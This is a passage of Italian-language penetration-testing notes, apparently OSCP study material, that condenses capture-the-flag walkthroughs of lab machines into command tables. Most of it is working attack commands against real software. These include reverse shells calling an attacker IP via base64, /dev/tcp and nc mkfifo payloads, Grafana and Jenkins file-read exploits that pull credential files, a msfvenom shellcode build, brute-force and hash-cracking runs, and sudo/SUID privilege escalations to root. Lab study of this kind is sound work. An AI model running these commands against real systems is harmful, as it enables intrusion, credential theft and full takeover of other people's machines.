| ---------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Mantis Bug Tracker** | 1.`php rougemysql.php`<br>2. `/var/www/bugtracker/config/config_inc.php`<br>3. *NAVIGARE:*`http://IP_TARGET/bugtracker/admin/install.php?install=3&hostname=IP_KALI`                                                                                                                                                                                                                                                                                                                                                                                                            | Con del fuzzing directories troviamo una cartella che porta al servizio *Mantis Bug Tracker* che √® vulerabile a [LFI](https://mantisbt.org/bugs/view.php?id=23173)<br>Scarichiamo il file [roguemysql.php](https://github.com/allyshka/Rogue-MySql-Server/blob/master/roguemysql.php) ed avviamolo con la *1.* dopodich√© inseriamo la *2.* per indicare il file da leggere (credenziali DB). Infine navighiamo il path *3.* per completare LFI |
| **MySQL**              | 1. `mysql -h IP_TARGET -u root -p`<br>2. `john hash --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5`                                                                                                                                                                                                                                                                                                                                                                                                                                                               | Utilizziamo la *1.* usando le credenziali ottenute prima per entrare nel DB. Troviamo le credenziali dell'utente amministratore, ora utilizziamo la *2.* per decifrarle                                                                                                                                                                                                                                                                        |
| **RCE**                | 1. `Manage->Manage Configuration->Configuration Report e cliccare "Create Configuration Option"`<br>2. `Type "relationship_graph_enable" into Configuration Option integer with a value of 1 to enable the graphs.`  <br>`Hit "Create Configuration Option"`<br>3. `Scroll back down to "Create Configuration Option"`  <br>`Type "dot_tool" into Configuration Option string with a value of "echo c2ggLWkgPiYgL2Rldi90Y3AvSVBfS0FMSS9MUE9SVCAwPiYx \| base64 -d \| /bin/bash;"`  <br>`Hit "Create Configuration Option"`<br>4. `Visit http://mantisbt/workflow_graph_img.php` | Con le credenziali di prima entriamo come utente administrator e seguiamo questa [guida](https://mantisbt.org/bugs/view.php?id=26091) per un RCE.<br><br>NB: cambiare la reverse shell scritta in base64 della *3.*<br>                                                                                                                                                                                                                        |
| **Pspy64s**            |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 | Utilizzando pspy64s troviamo un cronjob che inserisce delle credenziali in chiaro `mysqldump -u bugtracker -pBugTracker007` bugtracker che usiamo per diventare root                                                                                                                                                                                                                                                                           |


- [writeup](https://rouvin.gitbook.io/ibreakstuff/writeups/proving-grounds-practice/linux/mantis)


### FunBoxEasy

| üß† Azione          | üíª Comando / Metodo                                                              | üìù Output / Scopo                                                                                                                                                                                                                                                                                                                                                        |
| ------------------ | -------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **LFI**            | 1. ![[Pasted image 20250711123811.png]]<br>2. `john hash --wordlist=rockyou.txt` | Tramite fuzzing directories troviamo il path `/mini.php` che mostra i file presenti sulla cartella `/var/www/html`. Premendo su uno di essi notiamo che mostra il contenuto di quei file e ci√≤ significa che potrebbe essere vulnerabile a LFI.<br>Nell'immagine *1.* recuperiamo i file `/etc/passwd` dove otteniamo una password che possiamo craccare con la *2.*<br> |
| **SSH Bruteforce** | 1. `hydra -L users.txt -P users.txt ssh://IP_TARGET`                             | Con la *1.* facciamo un bruteforce ed otteniamo le credenziali `goat:goat`                                                                                                                                                                                                                                                                                               |
| **SUDO**           | 1. `sudo /usr/bin/mysql -e '\! /bin/sh'`                                         | Con i permessi SUDO l'utente pu√≤ utilizzare `mysql` che secondo [GTFObins](https://gtfobins.github.io/gtfobins/mysql/#sudo) √® vulnerabile. Usiamo la *1.* per diventare root                                                                                                                                                                                             |


## Arbitrary File Read

### Builder

| üß† Azione                | üíª Comando / Metodo                                                                                                                                                                                                                                                                                                                       | üìù Output / Scopo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                |
| ------------------------ | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **Jenkins 2.441**        | 1. `wget http://IP_TARGET:8080/jnlpJars/jenkins-cli.jar`<br>2. `java -jar jenkins-cli.jar -s http://IP_TARGET:8080/ -http connect-node "@/etc/passwd"`                                                                                                                                                                                    | Sulla porta `8080` troviamo *Jenkins 2.441* che √® vulnerabile a File Read [CVE-2024‚Äë23897](https://github.com/vulhub/vulhub/tree/master/jenkins/CVE-2024-23897?source=post_page-----143ad7fde347---------------------------------------). Utilizziamo la *1.* per scaricare il file `.jar` e la *2.* per PoC                                                                                                                                                                                     |
| **Jenkins Config Files** | 1. `java -jar jenkins-cli.jar -s http://IP_TARGET:8080/ -http help 1 "@/proc/self/environ"`<br>2. `java -jar jenkins-cli.jar -s http://IP_TARGET:8080/ -http connect-node "@/var/jenkins_home/users/users.xml"`<br>3. `java -jar jenkins-cli.jar -s http://IP_TARGET:8080/ -http connect-node "@/var/jenkins_home/users/USER/config.xml"` | Utilizziamo la *1.* per scoprire che la directory su cui si trova il servizio √® `/var/jenkins_home`.<br>Da questo [articolo](https://dev.to/pencillr/spawn-a-jenkins-from-code-gfa?source=post_page-----143ad7fde347---------------------------------------) ricaviamo dove si trovano i file principali del servizio. Utilizziamo la *2.* per enumerare gli utenti presenti e la *3.* per ricavarci la password hashata dell'utente<br><br>NB: il parametro USER nella *3.* dev'essere cambiato |
| **Cracking**             | 1. `john hash --wordlist=rockyou.txt`                                                                                                                                                                                                                                                                                                     | Utilizziamo la *1.* per craccare la password `princess`                                                                                                                                                                                                                                                                                                                                                                                                                                          |
| **SSH Private Key Root** | 1. ![[Pasted image 20250820121131.png]]                                                                                                                                                                                                                                                                                                   | Nella sezione DASHBOARD > CREDENTIALS troviamo la chiave privata SSH dell'utente root, possiamo vederla solo ispezionando il codice.<br>Googlando in `hudson.util.Secret.Decrypt` troviamo l'articolo [Decrypt Jenkins Pass](https://gist.github.com/tuxfight3r/eca9442ff76649b057ab) che ci spiega di andare su DASHBOARD > MANAGE JENKINS > SCRIPT CONSOLE e ci mostrer√† la chiave decriptata                                                                                                  |


- [writeup](https://medium.com/@fre1si/builder-htb-write-up-143ad7fde347)

### LinkVortex

| üß† Azione      | üíª Comando / Metodo                                                                                                                                             | üìù Output / Scopo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          |
| -------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Git**        | 1. `python3 git_dumper.py URL FOLDER`                                                                                                                           | Facendo fuzzing directories sul sottodominio `dev.linkvortex.htb` troviamo la cartella `/.git` che scarichiamo in locale con la *1*. Ispezionando le cartelle troviamo il file `authentication.test.js` dove sono presenti delle credenziali                                                                                                                                                                                                                                                                                                                                                               |
| **Ghost 5.58** | 1. `./exploit.sh -u EMAIL -p PASS -h DOMAIN`                                                                                                                    | Utilizziamo le credenziali appena trovate per effettuare l'accesso sulla pagina principale dove √® attivo il servizio *Ghost 5.58* che √® vulnerabile a Arbitrary File Read [CVE-2023-40028](https://github.com/0xyassine/CVE-2023-40028). Utilizziamo la *1.* per leggere il file di configurazione `/var/lib/ghost/config.production.json` da dove ci ricaviamo delle credenziali SSH                                                                                                                                                                                                                      |
| **SUDO**       | 1. `ln -s /root/root.txt flag.txt`<br>2. `ln -s /home/bob/flag.txt flag.png`<br>3. `sudo CHECK_CONTENT=true /usr/bin/bash /opt/ghost/clean_symlink.sh flag.png` | Tra i file SUDO √® presente uno script che permette di leggere il contenuto di file con estensione `.png` che non contengano riferimenti alla cartella `/root`. <br>Per bypassare il limite sulla cartella `/root` creiamo un file che linka un secondo file, che a sua volta linka la cartella; poich√© il controllo avviene solo sulla prima cartella. Utilizziamo la *1.* per creare il primo file che linka la cartella `/root` ed usiamo la *2.* per creare il secondo file che linka il primo. Infine usiamo la *3.* per leggere il contenuto<br><br>NB: `CHECK_CONTENT=true` √® richiesto dallo script |



- [writeup](https://systemweakness.com/htb-linkvortex-machine-walkthrough-explanation-300f57c45705)

## RFI

### Snookums

| üß† **Azione**              | üíª **Comando / Metodo**                | üìù **Output / Scopo**                                                                                                                                                                                                                                                                                                                                |
| -------------------------- | -------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **PHP Photo Gallery v0.8** | 1. `/image?img=http://IP_KALI/rev.php` | Navigando sulla pagina principale che √® presente il servizio *PHP Photo Gallery v0.8* che √® vulnerabile a [RFI](https://github.com/beauknowstech/SimplePHPGal-RCE.py/blob/main/SimplePHPGal-RCE.py). Guardando il codice ci rendiamo conto che il path `/image?img=` √® causa di vulnerabilit√†. Con la *1.* avviamo la reverse shell di pentestmonkey |
| **PwnKit**                 | 1. `python CVE-2021-4034.py`           | Avviando linpeas.sh vediamo che il sistema operativo √® vulnerabile a [PwnKit](https://github.com/joeammond/CVE-2021-4034/blob/main/CVE-2021-4034.py?source=post_page-----1f3e80951b53---------------------------------------)                                                                                                                        |

### Fanatastic

| üß† **Azione**         | üíª **Comando / Metodo**                                                                                                                                                                                                                                                            | üìù **Output / Scopo**                                                                                                                                                                                                                                                                                                                                                                                                                               |
| --------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Grafana 8.3.0**     | 1. ```curl --path-as-is "http://IP_TARGET:3000/public/plugins/alertlist/<br>../../../../../../../../../etc/passwd```<br>2. ```curl --path-as-is "http://IP_TARGET:3000/public/plugins/alertlist<br>/../../../../../../../../../var/lib/grafana/grafana.db" --output database.db``` | L'interfaccia di login mostra *Grafana 8.3.0* che √® vulnerabile [RFI](https://www.exploit-db.com/exploits/50581) . Utilizziamo la *1.* per PoC e la *2.* per leggere il file contenente le credenziali. Lo abbiamo trovato googlando *what is the default location for grafana database*Nota che il nome del plugin potrebbe cambiare (sceglierne uno dalla lista di ExploitDB)<br><br>*NB:* il parametro `--path-as-is` impedisce reindirizzamenti |
| **DB browser SQLite** | 1. `python3 -m venv venv`<br>2. `source bin/activate/venv`<br>3. `pip install requests questionary termcolor cryptography`<br>4. `wget https://raw.githubusercontent.com/Sic4rio/Grafana-Decryptor-for-CVE-2021-43798/refs/heads/main/decrypt.py`<br>5. `python3 decrypt.py`       | Utilizziamo dalla GUI *DB Browser SQLite* per aprire il file `database.db`. Apriamo la tabella `datasource` . Googlando troviamo che Grafana utilizza credenziali cifrati in *AES*. Utilizziamo questo [tool](https://github.com/Sic4rio/Grafana-Decryptor-for-CVE-2021-43798) per decriptare. Con la *4.* lo scarichiamo e *5.* per avviarlo                                                                                                       |
| **Disk group**        | 1. `id`<br>2. `df -h`<br>3. `debugfs /dev/sda2`<br>4. `cat /root/proof.txt`                                                                                                                                                                                                        | Una volta entrati come `sysadmin`, notiamo con *1.* che l'utente fa parte del gruppo `disk` quindi possiamo entrare nel disco e legger il flag del root                                                                                                                                                                                                                                                                                             |

- [writeup](https://al1z4deh.medium.com/proving-grounds-fanatastic-b14a6e535e1f)


### Data

| üß† **Azione**          | üíª **Comando / Metodo**                                                                                                                                                                                                                                                  | üìù **Output / Scopo**                                                                                                                                                                                                                                                                                                                                                                                                                                |
| ---------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Grafana 8.0.0**      | 1. ```curl --path-as-is "http://IP_TARGET:3000/public/plugins/alertlist/<br>..stat/../../../../../etc/passwd```<br>2. ```curl --path-as-is "http://IP_TARGET:3000/public/plugins/stat<br>/../../../../../../../../../var/lib/grafana/grafana.db" --output database.db``` | L'interfaccia di login mostra *Grafana 8.0.0* che √® vulnerabile [RFI](https://www.exploit-db.com/exploits/50581) . Utilizziamo la *1.* per PoC e la *2.* per leggere il file contenente le credenziali. Lo abbiamo trovato googlando *what is the default location for grafana database* Nota che il nome del plugin potrebbe cambiare (sceglierne uno dalla lista di ExploitDB)<br><br>*NB:* il parametro `--path-as-is` impedisce reindirizzamenti |
| **SQLite**             | 1. `.tables`<br>2. `SELECT * FROM user;`                                                                                                                                                                                                                                 | Con il comando *1.* e *2.* controlliamo le password presenti sulla tabella users                                                                                                                                                                                                                                                                                                                                                                     |
| **Cracking**           | 1. `python3 grafana2hashcat.py FILE_HASH -o OUTPUT_FILE`<br>2. `hashcat -m 10900 OUTPUT_FILE --wordlist rockyou.txt`                                                                                                                                                     | Le password di *Grafana* devono prima essere convertite con il tool [grafana2hashcat](https://github.com/iamaldi/grafana2hashcat) come in *1.* per poi essere craccate con la *2.*<br><br>NB: il file contentente gli hash da convertire dev'essere del formato `PASS,FILTER1`                                                                                                                                                                       |
| **SUDO**               | 1. `ps awwfux`<br>2. `sudo docker exec -it --privileged --user root ID_CONTAINER /bin/bash`                                                                                                                                                                              | Ottenuta l'utenza `boris:beautiful1` entriamo tramite SSH. Poich√© l'indirizzo IP che appare sulla shell non corrisponde a quello della macchina target, fa supporre che ci troviamo in una container. L'utente attuale ha i permessi sudo per `sudo /snap/bin/docker exec *` (ci√≤ rafforza i dubbi sul container).<br>Con la *1.* ci troviamo i container attualmente attivi sulla macchina e con la *2.* avviamo una bash nel container in root     |
| **Filesystem mounted** | 1. `mount`<br>2. `mount /dev/xvda1 /tmp`                                                                                                                                                                                                                                 | Adesso che abbiamo i permessi root dentro il container, possiamo montare il filesystem dell'host con la *1.* e *2.*                                                                                                                                                                                                                                                                                                                                  |


- [writeup](https://dan-feliciano.com/2024/06/05/data/)


## API

### Node

| üß† **Azione**  | üíª **Comando / Metodo**                                                                                                                                       | üìù **Output / Scopo**                                                                                                                                                                                                                                                                                                                                                                                                                    |
| -------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Bruteforce** |                                                                                                                                                               | Navigando il codice sorgente della pagina troviamo dei file `.js` che al loro interno contengono riferimento ad api tra cui  `/api/controller/users`. Navigando il path citato troviamo le credenziali di tutti gli utenti                                                                                                                                                                                                               |
| **Cracking**   | 1. `zip2john file.zip > hash`<br>2. `john --wordlist=/usr/share/wordlists/rockyou.txt hash`                                                                   | Entrando con le credenziali dell'amministratore possiamo scaricare un file `.zip` con password. Utilizziamo `john` per trovare la password e decifrarlo.                                                                                                                                                                                                                                                                                 |
| **Bruteforce** | `hydra -L users.txt -P pass.txt ssh://IP_TARGET`                                                                                                              | All'interno del file √® presente `app.js` contenente le le credenziali dell'utente `mark`; le utilizziamo per un bruteforce sulla porta *SSH*                                                                                                                                                                                                                                                                                             |
| **Database**   | 1. `ps -aux`<br>2. `mysql -u mark -p PASS scheduler`<br>3. `db.tasks.insert({"cmd":"bash -c 'bash -i >& /dev/tcp/IP_KALI/4444 0>&1'"})`<br>4. `nc -lvnp 4444` | Una volta entrati come `mark` guardando i processi con *1.* notiamo che egli ha avviato due processi `app.js` e leggendoli capiamo che l'utente ha accesso al DB `tom` esegue tramite funzione `exec()` delle task presenti nel DB. Se iniettiamo una Reverse Shell tra le task allora eseguir√† anche quella e divneteremo `tom`<br>Effettuiamo l'accesso come `mark` al database scheduler con la *2.* ed inseriamo il task con la *3.* |
| **Cronjob**    | 1. `./pspy64`<br>2. `var exec = require('child_process').exec;`<br>`exec('cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash'`                                | Scaricando `pspy` ed eseguendolo sulla macchina target notiamo che esiste il file `/home/mark/backup.js` eseguito da root ma che √® sovrascrivibile dall'utente `mark`. Sovrascriviamo il file con la *2.* cos√¨ da creare un file in SUID in modo che chiunque lo avvii diventi `root`                                                                                                                                                    |

### Hunit

| üß† **Azione** | üíª **Comando / Metodo**                                                                                                                                                                                                                                                      | üìù **Output / Scopo**                                                                                                                                                                                                |
| ------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **API**       |                                                                                                                                                                                                                                                                              | Navigando sul sito, nel codice sorgente trovo un link  che fa riferimento a delle `/api/` e navigandole trovo una pagina JSON che fa riferimento a `/api/users/` dove sono presenti username e password degli utenti |
| **SSH**       | 1. `ssh -p 43022 dademola@IP_TARGET`                                                                                                                                                                                                                                         | Provando tutte le credenziali e riesco ad entrare con `dademola:ExplainSlowQuest110`                                                                                                                                 |
| **GitHub**    | 1. `find / -name git-server 2>/dev/null`<br>2. `git clone file:///git-server`                                                                                                                                                                                                | Troviamo il file `/etc/cronta.bak` dove capiamo che il `/root/git-server/backups.sh` e `/root/pull.sh`. Troviamo `/git-server` con la *1.* e quindi lo scarichiamo sulla nostra cartella con la *2.*                 |
| **Git**       | 1. `ssh -p 43022 git@IP_TARGET -i id_rsa`                                                                                                                                                                                                                                    | Non possiamo leggere il file quindi dobbiamo entrare come utente `git`. Cerchiamo la chiave privata nella directory e la troviamo ma purtroppo la shell √® restricted                                                 |
| **Git push**  | 1. `GIT_SSH_COMMAND='ssh -i id_rsa -p 43022' git clone git@IP_TARGET:/git-server`<br>2. `echo "sh -i >& /dev/tcp/1IP_TARGET/PORT 0>&1" >> backups.sh`<br>3. `git add -A`<br>4. `git commit -m "rce"`<br>5. `GIT_SSH_COMMAND='ssh -i id_rsa -p 43022' git push origin master` | Con la *1.* prendiamo il file, con la *2.* inseriamo una reverse shell. Infine con *3.*, *4.* e *5.* inseriamola sulla macchina in remoto                                                                            |

- [writeup](https://medium.com/@bdsalazar/proving-grounds-hunit-intermediate-linux-box-walkthrough-a-journey-to-offensive-security-36081fc196d)

### XposedAPI

| üß† **Azione**         | üíª **Comando / Metodo**                                                                                                                     | üìù **Output / Scopo**                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               |
| --------------------- | ------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **HTTP Manipulation** |                                                                                                                                             | Dalla pagina principale notiamo diversi path. `/logs` √® protetto da WAF dunque aggiungiamo l'header `X-Forwarded-For: 127.0.0.1` nella richiesta in modo da bypassarlo.<br>La pagina fa riferimento ad un parametro di nome `?file=` e giocandoci notiamo che possiamo utilizzarlo per leggere file sulla macchina e da `/etc/passwd` leggiamo gli utenti presenti sulla macchina.<br><br>Poich√© il titolo della macchina suggerisce che utilizza *API* leggiamo un file tipico di *Flask* `?file=./main.py` dove capiamo che possiamo eseguire codice su `/upload` |
| **RCE**               | 1. ```{<br>"user":"user"<br>"url":"http://IP_KALI; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|sh -i 2>&1\|nc 192.168.45.237 13337 >/tmp/f"<br>}``` | Visitando il path `/upload` ci informa che il parametro GET non √® supportato, dunque proviamo con POST e va bene. Dalla pagina principale sappiamo che possiamo fare richieste JSON come nella *1.* passando per parametri `user` e `url`                                                                                                                                                                                                                                                                                                                           |
| **SUID**              | 1. `TF=$(mktemp)`<br>2. `chmod +x $TF`<br>3. `echo -e '#!/bin/sh -p\n/bin/sh -p 1>&0' >$TF`<br>4. `/usr/bin/wget --use-askpass=$TF 0`       | Tra i file SUID notiamo `wget` che seguendo [GTFObins](https://gtfobins.github.io/gtfobins/wget/#suid) √® vulnerabile                                                                                                                                                                                                                                                                                                                                                                                                                                                |

- [writeup](https://medium.com/@malwarejoe/xposedapi-offsec-proving-grounds-lab-write-up-3848be2c61d3)


### Amaterasu

| üß† **Azione**   | üíª **Comando / Metodo**                                                                                                                                                                                                                  | üìù **Output / Scopo**                                                                                                                                                                                                                       |
| --------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **API**         |                                                                                                                                                                                                                                          | Con il fuzzing directories troviamo la cartella `/api` dove sono presenti tutte le chiamate possibili con le API. Navighiamo `/file-list?dir=/home/alfredo` e notiamo che √® presente una cartella `.ssh`                                    |
| **POST Method** | 1. `ssh-keygen`<br>2. `mv id_rsa.pub authozied_keys.txt`<br>3. `curl -H 'Content-Type: multipart/form-data' -F file='@/home/kali/htb/authorized_keys.txt' -F filename='/home/alfredo/.ssh/authorized_keys' http://IP_TARGET/file-upload` | `/file-upload` accetta il metodo POST per file di tipo `.txt` quindi potremmo usarlo per inserire una chiave pubblica all'utente `alfredo`. Usiamo la *1.* per creare una chiave in locale e la *3.* per uploadarla                         |
| **Cronjob**     | 1. `echo -e "#! /bin/bash\nchmod u+s /bin/bash" > tar`<br>2. `/bin/bash -p`                                                                                                                                                              | Guardando `/etc/crontab` notiamo che l'utente root utilizza uno script che esegue il comando `tar` senza il path assoluto. Poich√© il valore di PATH comprende gi√† la cartella `/home/alfredo` possiamo creare con la *1.* un `tar` malevolo |


- [writeup](https://medium.com/@rizzziom/amaterasu-walkthrough-proving-ground-6c458abda9e3)


### Mentor

| üß† **Azione**         | üíª **Comando / Metodo**                                                                                                                                                                                                                    | üìù **Output / Scopo**                                                                                                                                                                                                                                                                    |
| --------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **API**               |                                                                                                                                                                                                                                            | Con un fuzzing sui sottodomini troviamo il sottodominio `api.mentorquotes.htb`. Facendo un ulteriore fuzzing sulle directories su questo sottodominio troviamo la cartella `/docs` dove √® presente il manuale per sfruttare le API                                                       |
| **SNMP Enumeration**  | 1. `python3 snmpbrute.py -t IP_TARGET`<br>2. `snmpwalk -v2c internal -c IP_TARGET`                                                                                                                                                         | Scarichiamo [snmpbrute.py](https://github.com/SECFORCE/SNMP-Brute) ed enumeriamo con la *1.* il servizio *SNMP*. Troviamo la sezione `internal` dunque ascoltiamo il suo contenuto UDP con la *2.*. Troviamo delle credenziali                                                           |
| **API Login**         | 1. ![[Pasted image 20250814173537.png]]                                                                                                                                                                                                    | Utilizziamo le credenziali trovate poc'anzi per effettuare richieste il login con le API ottenendo cos√¨ il token di autenticazione. Utilizziamo il token per effettuare altre richieste API come nella *1.*                                                                              |
| **Command Injection** | 1. ![[Pasted image 20250814173657.png]]                                                                                                                                                                                                    | Scopriamo che il parametro `path` √® vulnerabile a Command Injection dunque facciamo come nella *1.* per avviare una reverse shell                                                                                                                                                        |
| **Port Forwarding**   | 1. ![[Pasted image 20250814173849.png]]<br>2. *KALI:* `./chisel server --port 9002 --reverse`<br>3. *TARGET*`./chisel client -v IP_KALI:9002 R:5432:IP_TARGET:5432`<br>4. *KALI*`psql -h 127.0.0.1 -p 5432 -d mentorquotes_db -U postgres` | Nel percorso `/app/app/db.py` troviamo un riferimento ad un database *PostgresSQL* non accessibile dall'esterno (foto *1.*). Utilizziamo la *2.* e *3.* per forwardare la porta internamente.<br>Infine effettuiamo l'accesso con la *4.* con credenziali di default `postgres:postgres` |
| **SUDO**              | 1. `sudo /bin/sh -p`                                                                                                                                                                                                                       | Nel database troviamo le credenziali di `james` che cracchiamo utilizzando crackstation. Utilizzando i permessi SUDO notiamo che l'utente pu√≤ effettuare il comando `/bin/sh` come amministratore dunque usiamo la *1.* per divenare root                                                |


- [writeup](https://medium.com/@YMTzioni/htb-write-up-mentor-d00544dd79c5)

### Monitored

| üß† **Azione**                 | üíª **Comando / Metodo**                                                                                                                                                                             | üìù **Output / Scopo**                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                |
| ----------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **SNMP**                      | 1. `python3 snmpbrute.py -t IP_TARGET`<br>2. `snmpwalk -vc2 -c public IP_TARGET`                                                                                                                    | Tramite una scansione delle porte UDP scopriamo che la `161` √® aperta. Utilizziamo la *1.* per enumerare la porta *SNMP*. Filtrando solo le righe con `STRING` troviamo le credenziali `svc:password`                                                                                                                                                                                                                                                                                                                                                                                                |
| **API Nagios XI**             | 1. ![[Pasted image 20250818164225.png]]<br>2. ![[Pasted image 20250818164813.png]]                                                                                                                  | Proviamo le credenziali sull'interfaccia di login ed otteniamo l'errore nella *1.* e questo ci fa capire che l'account esisteva. Probabilmente lo stesso account ha accesso ad altre parti tipo API.<br>Troviamo in rete questo [articolo](https://assets.nagios.com/downloads/nagiosxi/docs/Accessing-and-Using-the-XI-REST-API.pdf) su come effettuare l'accesso tramite API sul servizio *Nagios XI*. Effettuiamo l'accesso come nella *2.* ed otteniamo le chiave API dell'utente. Navighiamo la pagina `https://nagios.monitored.htb/nagiosxi/login.php?token=API_KEY` per effettuare l'accesso |
| **Nagios 5.11 SQL Injection** | 1. ![[Pasted image 20250818165146.png]]<br>2. `sqlmap -r item -p id --level 5 --risk 3 --batch`                                                                                                     | Una volta dentro scopriamo che la versione del servizio √® *Nagios XI 5.11* che √® vulnerabile a *SQLi* secondo [CVE-2023‚Äì40931](https://rootsecdev.medium.com/notes-from-the-field-exploiting-nagios-xi-sql-injection-cve-2023-40931-9d5dd6563f8c).<br>Catturiamo la richiesta come nella *1.* ed utilizziamo `sqlmap` come nella *2.* per leggere il database dove troviamo l'API dell'utente admin.                                                                                                                                                                                                 |
| **New User**                  | 1. `curl -XPOST "http://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey=API_KEY&pretty=1" -d "username=username&password=password&name=username&email=username@localhost&auth_level=admin"` | Tramite l'API dell'utente amministratore, secondo questo [articolo](https://support.nagios.com/forum/viewtopic.php?t=42923), possiamo creare un nuovo utente con privilegi da amministratore *1.*                                                                                                                                                                                                                                                                                                                                                                                                    |
| **Reverse shell**             | 1. ![[Pasted image 20250818170103.png]]<br>2. ![[Pasted image 20250818170238.png]]<br>                                                                                                              | Effettuiamo l'accesso con il nuovo utente `username:password` ed andiamo CONFIGURE > CORE CONFIG MANAGER > COMMANDS > ADD NEW e facciamo come nella *1.*<br>in seguito andiamo CONFIGURE > CORE CONFIG MANAGER > HOSTS e clicchiamo LOCALHOST ed inseriamo quello creato prima come nella *2.* e permiamo RUN CHEK COMMAND                                                                                                                                                                                                                                                                           |
| **SUDO**                      | 1. `sudo /usr/local/nagiosxi/scripts/manage_services.sh start nagios`                                                                                                                               | Tra i permessi SUDO troviamo che l'utente pu√≤ utilizzare `manage_service.sh` che avvia alcuni script su cui noi abbiamo il controllo. Modifichiamo lo script `nagios` ed inseriamo una reverse shell ed usiamo la *1.*                                                                                                                                                                                                                                                                                                                                                                               |


- [writeup](https://medium.com/@qinncade/monitored-htb-writeup-as-oscp-preparation-6b66cea09b6e)

## BoF

### Kevin

| üß† **Azione**            | üíª **Comando / Metodo**                                                                                                                                                                                                                                                        | üìù **Output / Scopo**                                                                                                                                                                                   |
| ------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **HP Power Manager 4.2** | 1. `searchsploit -m 10099`<br>2. `msfvenom -p windows/shell_reverse_tcp -b ‚Äú\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x3d\x3b\x2d\x2c\x2e\x24\x25\x1a‚Äù LHOST=IP_KALI LPORT=443 -e x86/alpha_mixed -f c`<br>3. `nc -lvnp 443`<br>4. `python2 10099.py IP_TARGET`<br> | Il target utilizza `HP Power Manager 4.2` che √® vulnerabile a *RCE*. Utilizziamo la *1.* per prendere la vulnerabilit√†. Con la *2.* creiamo una reverse shell. Infine effettuiamo l'attacco con la *4.* |

## Phishing

### Postfish

| üß† **Azione**             | üíª **Comando / Metodo**                                                                                                                                                                                                                                              | üìù **Output / Scopo**                                                                                                                                                                                                                                                                                                                                                                                                   |
| ------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **User Enumerarion POP3** | 1. `./username-anarchy NOME COGNOME > names.txt`<br>2. `perl smtp-user-enum.pl -M VRFY -U names.txt -t IP_TARGET`                                                                                                                                                    | Dall'enumerazione troviamo che la porta *25 SMTP* e *110 POP3* sono aperte; con *1.* generiamo combinazione dei nomi trovati sul sito per fare una wordlist. Con la *2.* passiamo la wordlist generata e verifichiamo gli utenti attivi sulla macchina.                                                                                                                                                                 |
| **Bruteforce**            | 1. `hydra -L names.txt -P names.txt imap://IP_TARGET`                                                                                                                                                                                                                | Effettuiamo un bruteforce con `crackmapexec` passado la stessa lista sia per username che password. Troviamo le credenziali `sales:sales`                                                                                                                                                                                                                                                                               |
